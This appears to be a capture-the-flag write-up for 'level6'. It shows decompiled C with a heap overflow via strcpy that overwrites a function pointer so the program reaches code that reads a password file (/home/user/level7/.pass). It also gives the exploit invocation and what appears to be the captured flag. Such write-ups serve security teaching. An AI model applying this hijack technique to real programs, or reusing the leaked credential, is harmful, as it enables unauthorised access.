```c
void n(void) // 08048454
{
  system("/bin/cat /home/user/level7/.pass");
  return;
}

void m(void *param_1, int param_2, char *param_3, int param_4, int param_5) // 08048468
{
  puts("Nope");
  return;
}

void main(int argc, char **argv)
{
  char *vuln;
  void **func;
  
  vuln = (char *)malloc(64);
  func = (void **)malloc(4);
  *func = m;
  strcpy(vuln, argv[1]);
  (**func)();
  return;
}
```

We can use exactly the same exploit as in the second exercise, we just need to change the offsets and the `EIP` value. 

```bash
./level6 $(python /tmp/exploit.py)
```

`f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
